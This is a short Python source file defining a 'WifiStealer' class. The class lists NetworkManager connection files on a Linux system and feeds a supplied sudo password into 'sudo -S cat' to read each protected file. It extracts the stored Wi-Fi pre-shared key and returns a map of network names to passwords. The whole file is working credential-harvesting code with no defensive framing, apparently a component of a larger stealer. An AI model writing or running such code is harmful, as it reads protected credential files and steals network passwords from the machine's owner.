import subprocess as sp


class WifiStealer:
    def __init__(self, sudo_password):
        self.sudo_password = sudo_password

    @staticmethod
    def _get_list_of_networks() -> list:
        cmd1 = sp.Popen('ls', cwd='/etc/NetworkManager/system-connections/', stdout=sp.PIPE)
        output_data: str = cmd1.stdout.read().decode()
        networks = [network for network in output_data.split('\n') if network]
        return networks

    def _get_network_password(self, network_name: str) -> str:
        command = ['cat', network_name]

        cmd1 = sp.Popen(['echo', self.sudo_password], stdout=sp.PIPE)
        cmd2 = sp.Popen(['sudo', '-S'] + command, stdin=cmd1.stdout, stdout=sp.PIPE,
                        cwd='/etc/NetworkManager/system-connections/')
        password = ''
        output = cmd2.stdout.read().decode().split()
        for words in output:
            if words.startswith('psk'):
                password = words
                break
        return password

    def collect_all_info(self):
        result = dict()
        list_of_networks = self._get_list_of_networks()
        for network_name in list_of_networks:
            password = self._get_network_password(network_name=network_name)
            result.update({network_name: password})
        return result
